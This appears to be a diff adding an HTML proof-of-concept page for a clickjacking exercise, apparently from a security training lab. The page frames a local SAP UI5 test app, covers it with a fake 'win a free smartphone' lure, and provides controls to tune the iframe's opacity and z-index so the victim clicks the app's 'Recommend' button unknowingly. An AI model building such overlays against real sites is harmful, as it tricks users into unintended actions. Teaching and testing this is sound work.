@@ -1,0 +1,98 @@
+<html>
+<head>
+    <title>Game</title>
+
+    <script type="text/javascript">
+
+        function onFrameStyleChange(sProperty, oValue) {
+            document.getElementById("frame1").style[sProperty] = oValue;
+        }
+
+    </script>
+
+</head>
+
+<style type="text/css">
+
+    .mapped {
+        position: relative;
+        top: 12rem;
+        left: 12.5rem;
+        padding: 1rem;
+        background-color: darkgreen;
+        border-radius: 5px;
+        border-color: white;
+        color: white;
+        border-width: 1rem;
+    }
+
+    .header {
+        background-color: white;
+        padding: 0.5rem;
+        border-radius: 5px;
+    }
+
+</style>
+
+<body>
+
+    <!-- FRAME -->
+    <iframe src="webapp/test/testService.html?sap-ui-theme=sap_belize#/Post/PostID_1"
+            id="frame1"
+            style="width: 70%; height:70%"/>
+    </iframe>
+
+    <!-- MASKING CONTENT -->
+    <div align="right"
+         style="position:relative; width: 70%;height:70%; z-index:1; text-align:left; padding:2rem; background-image:url('img/blockchain_Feature.jpg'); background-repeat: no-repeat">
+        <h1 class="header">Play the game to win a free smartphone!</h1>
+        <a class="mapped">Continue</a>
+    </div>
+
+    <!-- UI CONTROLS to modify frame styles (just for easier testing) -->
+    <div style="position:fixed; top:0; right:0">
+        <h3>Modify iframe values:</h3>
+        (to trick the victim click <br>
+        on the "Recommend" button <br>
+        inside the app while <br>
+        thinking he is clicking <br>
+        on the green "Continue" button)
+    <p>opacity:<br>
+        <input id="opacityInput" type="number" step="any" name="task3_opacity" value="1" style="width:10rem"><br></p>
+    <p>z-index:<br>
+        <input id="z_indexInput" type="number" step="1" name="task3_z_index" value="0" style="width:10rem"><br></p>
+    <p>position:<br>
+        <input id="positionInput" type="text" name="task3_position" value="static" style="width:10rem"> <br>(static|<br>absolute|<br>relative)<br></p>
+    <p>width:<br>
+        <input id="widthInput" type="number" step="1" name="task3_width" value="70" style="width:10rem"> % <br></p>
+    <p>height:<br>
+        <input id="heightInput" type="number" step="1" name="task3_height" value="70" style="width:10rem"> % <br></p>
+
+        <h3>Note that the tested app </br>
+            does not save any changes on the server </br>
+            (ok for our test setup). </br>
+            So just hit "REFRESH" </br>
+            to restore the initial state </h3>
+    </div>
+
+    <script type="text/javascript">
+
+        function setChangeListener(sId, sProperty) {
+            var input = document.getElementById(sId);
+            input.onkeydown=input.onkeyup=input.onclick=function() {
+                var bNeedsPercentageSuffix = (sProperty == 'height') || (sProperty == 'width'),
+                        sSuffix = bNeedsPercentageSuffix ? "%" : "";
+                onFrameStyleChange(sProperty, this.value + sSuffix);
+            }.bind(input);
+        }
+
+        setChangeListener("opacityInput", 'opacity');
+        setChangeListener("z_indexInput", 'z-index');
+        setChangeListener("positionInput", 'position');
+        setChangeListener("widthInput", 'width');
+        setChangeListener("heightInput", 'height');
+
+    </script>
+
+</body>
+</html>
